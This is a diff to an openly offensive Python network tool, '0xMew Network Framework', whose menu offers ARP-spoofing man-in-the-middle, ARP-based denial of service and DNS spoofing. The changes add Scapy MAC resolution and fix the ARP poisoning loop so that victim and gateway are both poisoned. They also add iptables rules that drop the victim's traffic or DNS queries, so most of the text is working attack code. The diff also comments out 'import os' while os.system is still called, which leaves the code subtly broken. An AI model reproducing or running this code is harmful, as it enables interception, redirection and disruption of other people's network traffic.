@@ -1,4 +1,4 @@
-import os
+# import os
 import sys
 import time
 import signal
@@ -20,7 +20,7 @@ CURRENT_LANG = 'en'
 # СЛОВАРЬ ПЕРЕВОДОВ
 TRANS = {
     'en': {
-        'banner_subtitle': "/// 0xMew Network Framework v3.4 (Stable) ///",
+        'banner_subtitle': "/// 0xMew Network Framework v3.5 (Stable) ///",
         'h_local': " local_network ", 'h_recon': " information_gathering ",
         'h_wifi': " wireless_attacks ", 'h_osint': " osint_person ", 'h_utils': " utilities ",
         'opt_1': "1. arp_spoof (MITM)", 'opt_2': "2. arp_kill (DoS)", 'opt_7': "7. dns_spoof (Redirect)",
@@ -53,7 +53,7 @@ TRANS = {
         'holmes_found': " [+] FOUND: {}",
     },
     'ru': {
-        'banner_subtitle': "/// 0xMew Network Framework v3.4 (Stable) ///",
+        'banner_subtitle': "/// 0xMew Network Framework v3.5 (Stable) ///",
         'h_local': " local_network ", 'h_recon': " information_gathering ",
         'h_wifi': " wireless_attacks ", 'h_osint': " osint_person ", 'h_utils': " utilities ",
         'opt_1': "1. arp_spoof (перехват)", 'opt_2': "2. arp_kill (DoS)", 'opt_7': "7. dns_spoof (редирект)",
@@ -158,6 +158,19 @@ def change_mac_auto(iface):
 def toggle_forward(state):
     val = "1" if state else "0"
     os.system(f"echo {val} > /proc/sys/net/ipv4/ip_forward")
+def get_mac(ip):
+    # Создаем запрос ARP
+    arp_request = ARP(pdst=ip)
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+
+    # Отправляем и ждем ответа (timeout=1 секунда)
+    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
+
+    # Если кто-то ответил — возвращаем его MAC
+    if answered_list:
+        return answered_list[0][1].hwsrc
+    return None
 
 # --- MODULES ---
 def guess_os(ttl):
@@ -305,12 +318,29 @@ def sni_callback(pkt):
         except: pass
 
 def run_attack(mode, target, gateway, iface):
+    # 1. Сначала узнаем MAC-адреса жертвы и шлюза
+    print(f"[*] Resolving MAC addresses for {target} and {gateway}...")
+    target_mac = get_mac(target)
+    gateway_mac = get_mac(gateway)
+
+    if not target_mac:
+        print(f"\033[91m[!] Ошибка: Не удалось найти MAC адрес цели ({target}). Она онлайн?\033[0m")
+        return
+    if not gateway_mac:
+        print(f"\033[91m[!] Ошибка: Не удалось найти MAC адрес шлюза ({gateway}).\033[0m")
+        return
+
+    print(f" [+] Target: {target} is at {target_mac}")
+    print(f" [+] Gateway: {gateway} is at {gateway_mac}")
+
     toggle_forward(True)
-    if mode == '2':
+
+    if mode == '2': # ARP KILL (DoS)
         print(t('kill_enable'))
         subprocess.run(f"iptables -A FORWARD -s {target} -j DROP", shell=True)
         subprocess.run(f"ip6tables -A FORWARD -j DROP", shell=True)
-    if mode == '7':
+
+    if mode == '7': # DNS SPOOF
         global SPOOF_DOMAIN, REDIRECT_IP
         SPOOF_DOMAIN = input(t('prompt_domain')).strip()
         REDIRECT_IP = input(t('prompt_redirect')).strip()
@@ -319,13 +349,19 @@ def run_attack(mode, target, gateway, iface):
         subprocess.run(f"iptables -A FORWARD -s {target} -p udp --dport 53 -j DROP", shell=True)
 
     callback = dns_responder if mode == '7' else sni_callback
+    # Фильтр для сниффера
     sniffer = AsyncSniffer(iface=iface, prn=callback, filter=f"host {target} and (port 443 or port 53)", store=0)
     sniffer.start()
+
     if mode == '1': print(t('attack_start').format(target))
+
     try:
         while True:
-            send(ARP(op=2, pdst=target, psrc=gateway), verbose=False)
-            send(ARP(op=2, pdst=gateway, psrc=target), verbose=False)
+            # ИСПРАВЛЕНИЕ: Теперь явно указываем hwdst (MAC получателя)
+            # 1. Говорим жертве (target), что мы — шлюз
+            send(ARP(op=2, pdst=target, hwdst=target_mac, psrc=gateway), verbose=False)
+            # 2. Говорим шлюзу (gateway), что мы — жертва
+            send(ARP(op=2, pdst=gateway, hwdst=gateway_mac, psrc=target), verbose=False)
             time.sleep(2)
     except KeyboardInterrupt:
         sniffer.stop()
@@ -336,6 +372,7 @@ def run_attack(mode, target, gateway, iface):
         if mode == '7':
             print(t('kill_disable'))
             subprocess.run(f"iptables -D FORWARD -s {target} -p udp --dport 53 -j DROP", shell=True)
+            subprocess.run(f"iptables -D FORWARD -s {target} -p udp --dport 53 -j DROP 2>/dev/null", shell=True) # Дубль на всякий
         print(t('stop_msg'))
 
 def check_opsec(iface):
